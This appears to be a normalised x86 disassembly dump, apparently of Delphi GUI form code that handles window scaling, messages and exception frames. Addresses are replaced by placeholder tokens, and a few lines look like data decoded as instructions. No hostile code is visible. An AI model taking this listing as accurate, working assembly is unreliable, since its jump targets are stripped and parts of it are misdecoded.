mov eax [ ebx + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x288 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_43e088
mov [ ebx + 0x278 ] 0x2
mov dl 0x1
mov eax [ r-xdata ]
call sub_425108
mov esi eax
mov [ ebx + 0x280 ] esi
mov eax esi
mov edx ebx
call sub_44f140
movzx eax [ r-xdata ]
mov [ ebx + 0x270 ] al
mov [ ebx + 0x271 ] 0x2
mov [ ebx + 0x273 ] 0x0
mov [ ebx + 0x279 ] 0x3
mov [ ebx + 0x28c ] 0x0
mov eax [ ebx + 0x2a4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x40 ]
mov [ eax ] edx
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_448068
mov edx [ ebx + 0x2a4 ]
mov [ edx + 0x4 ] eax
mov eax ebx
call sub_447e3c
mov [ eax + 0x24 ] ebx
mov [ eax + 0x20 ] sub_447ef0
mov eax [ ebx + 0x2a4 ]
mov [ eax + 0x8 ] 0x0
mov [ ebx + 0x27d ] 0x1
mov eax ebx
call sub_404528
mov [ ebx + 0xac ] eax
mov [ ebx + 0x329 ] 0xff
xor eax eax
mov [ ebx + 0x354 ] eax
xor edx edx
mov eax ebx
call sub_43e40c
xor edx edx
mov eax ebx
call sub_450a5c
xor edx edx
mov eax ebx
call sub_4509c0
mov dl 0x1
mov eax ebx
call sub_4587e4
mov edx ebx
mov eax [ rw-data ]
call sub_443e74
mov [ ebx + 0x34c ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_43d5a1
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_420278
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4199dc
xor edx edx
mov eax ebx
call sub_41c920
cmp [ ebx + 0x2ac ] 0x0
je r-xdata
cmp [ ebx + 0x277 ] 0x1
je r-xdata
mov eax [ ebx + 0x2ac ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
mov eax ebx
call sub_442ba4
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
sub_43d60c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_404a1c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_445440
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_43d70c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_440fd0
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_443eac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_404650
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x288 ]
call sub_404650
mov eax [ ebp - 0x4 ]
add eax 0x32c
call sub_40f944
mov eax [ ebp - 0x4 ]
add eax 0x338
call sub_40f944
mov eax [ ebp - 0x4 ]
call sub_447e3c
call sub_404650
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
call sub_402f1c
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ca38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d713
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb4 ]
sub_43d728
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x31a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_43d769
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43e40c
sub_43d76e
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_40484c
test al al
jne r-xdata
call sub_404f40
mov eax [ ebp - 0x4 ]
test [ eax + 0x358 ] 0x2
je r-xdata
call sub_404eec
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_43e40c
sub_43d7a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x322 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_43d7e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_43d804
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_452fb8
cmp [ ebx + 0x268 ] 0x0
je r-xdata
mov eax ebx
call sub_447e3c
call sub_448128
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_447ef0
mov edi [ ebx + 0x268 ]
xor eax eax
mov [ ebx + 0x268 ] eax
mov eax edi
mov si 0xffb6
call sub_40484c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx edi
mov eax ebx
call sub_440ad0
sub_43d868
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_454748
mov eax ebx
sub al 0x1
jb r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
je r-xdata
cmp [ edi + 0x298 ] 0x0
je r-xdata
cmp [ edi + 0x290 ] 0x0
jne r-xdata
cmp esi [ edi + 0x290 ]
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x298 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x2a0 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43f914
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
cmp esi [ edi + 0x2a8 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43f8ec
mov edx esi
mov eax edi
call sub_43f914
jmp r-xdata
cmp esi [ edi + 0x334 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_43f8c8
mov eax [ edi + 0x32c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_43fc50
mov eax [ edi + 0x338 ]
test eax eax
je r-xdata
mov edx esi
call sub_4198f4
test eax eax
jl r-xdata
cmp esi [ edi + 0x340 ]
jne r-xdata
mov edx esi
call sub_4198f4
test eax eax
jl r-xdata
mov edx eax
mov eax [ edi + 0x32c ]
call sub_41978c
mov edx edi
mov eax esi
call sub_4202d8
cmp esi [ edi + 0x2c4 ]
jne r-xdata
xor eax eax
mov [ edi + 0x340 ] eax
mov edx eax
mov eax [ edi + 0x338 ]
call sub_41978c
mov edx edi
mov eax esi
call sub_4202d8
xor eax eax
mov [ edi + 0x2c4 ] eax
sub_43d9a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_454204
xor ecx ecx
push ebp
push sub_43dc21
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b0 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b4 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2b8 ] edx
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4045dc
cmp eax [ r-xdata ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45382c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov eax [ eax ]
test eax eax
je r-xdata
movzx eax [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x27c ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2b8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_450228
mov edx [ ebp - 0x4 ]
test [ edx + 0x8c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
mov [ eax + 0x8c ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_45026c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov edx [ rw-data ]
mov edx [ edx + 0x40 ]
mov [ eax ] edx
mov eax [ ebp - 0x4 ]
call sub_43dfd8
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
cmp esi eax
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_451b4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43dc28
mov eax [ ebp - 0x4 ]
call sub_45420c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43cf00
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4580b0
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43cf00
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2b8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450350
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2b8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4580b0
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_42499c
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_4249a4
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2b0 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b4 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2b4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x242 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x242 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b8 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x246 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x246 ] eax
sub_43dc34
push ebp
mov ebp esp
and eax 0x7f
cmp eax 0x5
ja r-xdata
xor eax eax
pop ebp
retn
jmp [ eax * 4 + jump_table_43dc4a ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_447e3c
cmp [ eax + 0xc ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_447e3c
cmp [ eax + 0x10 ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_447e3c
cmp [ eax + 0x14 ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_447e3c
cmp [ eax + 0x18 ] 0x0
setne al
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_447e3c
movzx eax [ eax + 0x8 ]
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_447e3c
movzx eax [ eax + 0x28 ]
pop ebp
retn
sub_43dcd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov edx ebx
mov eax [ esi ]
call sub_454cc4
push 0x0
push 0x0
mov eax [ esi ]
push eax
push sub_43df80
mov eax [ esi ]
movzx ecx [ eax + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_43df4c
mov eax [ esi ]
push eax
push sub_43df64
mov eax [ esi ]
movzx ecx [ eax + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_447e48
mov eax [ esi ]
push eax
push sub_447fc0
push ebp
mov al 0x3
call sub_43dc34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_447e64
mov eax [ esi ]
push eax
push sub_447fdc
push ebp
mov al 0x4
call sub_43dc34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_447e80
mov eax [ esi ]
push eax
push sub_447ff8
push ebp
xor eax eax
call sub_43dc34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_447e9c
mov eax [ esi ]
push eax
push sub_448014
push ebp
mov al 0x2
call sub_43dc34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_447eb8
mov eax [ esi ]
push eax
push sub_448030
push ebp
mov al 0x5
call sub_43dc34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov edi [ eax ]
call [ edi + 0x4 ]
mov eax [ esi ]
push eax
push sub_447ed4
mov eax [ esi ]
push eax
push sub_44804c
push ebp
mov al 0x1
call sub_43dc34
pop ecx
mov ecx eax
mov edx r-xdata
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43df2b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d0e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4509c0
sub_43dff3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43cf00
mov ecx edi
mov edx esi
mov eax ebx
call sub_450350
mov ecx edi
mov edx esi
mov eax ebx
call sub_4580b0
mov eax ebx
call sub_43e0e4
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_424a40
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_424a5c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_450254
mov ebp eax
push edi
push esi
mov eax ebx
call sub_450210
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_43e3a4
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_43e3d8
sub_43e088
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4585f8
call sub_43b75c
test eax eax
je r-xdata
mov eax ebx
call sub_458904
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ ebx + 0x271 ] 0x3
je r-xdata
mov eax ebx
call sub_441144
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4585f8
push eax
call SendMessageA
pop ebx
retn
sub_43e11c
push ebx
mov ebx eax
mov eax ebx
call sub_43f6a8
test al al
je r-xdata
xor eax eax
pop ebx
retn
movzx eax [ ebx + 0x271 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x258 ]
je r-xdata
sub_43e1b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4585f8
call sub_43b75c
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_458760
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x290 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4585f8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_43e238
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_458b60
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_420604
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4205d8
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40484c
test al al
jne r-xdata
sub_43e2a4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_404528
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_43e2e8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov eax ebp
call sub_4546e8
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_420604
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_458ba8
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4205d8
mov si 0xfff1
call sub_40484c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_420614
jmp r-xdata
sub_43e37c
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_450a80
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_451b4c
sub_43e3a4
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_450228
pop ebx
retn
mov [ ebx + 0x2b0 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x8c ]
mov [ ebx + 0x8c ] al
pop ebx
retn
sub_43e3d8
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_45026c
pop ebx
retn
mov [ ebx + 0x2b4 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x8c ]
mov [ ebx + 0x8c ] al
pop ebx
retn
sub_43e40c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x358 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_4507b4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x358 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x358 ] 0x2
jmp r-xdata
mov eax esi
call sub_43fdf4
pop esi
pop ebx
retn
sub_43e450
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43e536
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43e53d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
test [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov eax [ rw-data ]
call sub_44821c
mov edx eax
xor dl 0x1
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
xor ecx ecx
call sub_43b7d8
mov eax [ rw-data ]
call sub_44821c
push eax
mov eax ebx
call sub_4585f8
mov cl 0x1
pop edx
call sub_43b7d8
mov eax [ rw-data ]
call sub_44821c
xor al 0x1
push eax
mov eax ebx
call sub_4585f8
mov cl 0x1
pop edx
call sub_43b7d8
mov eax [ rw-data ]
movzx edx [ eax + 0x5b ]
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov cl 0x1
call sub_43b7d8
jmp r-xdata
sub_43e548
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
cmp ebx eax
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx [ ebp - 0x4 ]
je r-xdata
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_43e5f8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459998
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_459a60
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4551b8
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_459998
sub_43e604
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42044c
cmp [ ebx + 0x298 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x298 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_43e644
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x112
jg r-xdata
add edx 0xfffffce2
sub edx 0x2
jb r-xdata
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_447ef0
jmp r-xdata
sub edx 0xacfa
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfff0
cmp eax 0xf120
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4556f4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_40484c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
sub edx 0x2c
je r-xdata
mov eax [ rw-data ]
call sub_44821c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_40484c
jmp r-xdata
mov esi [ ebx + 0x4 ]
xor edi edi
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
call sub_448224
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
sub edx 0x1a
je r-xdata
test esi esi
je r-xdata
cmp eax [ rw-data ]
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x277 ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x290 ]
xor ecx ecx
call sub_437a24
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
jmp r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_451b4c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_451b4c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f4f4
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425108
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43e9c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
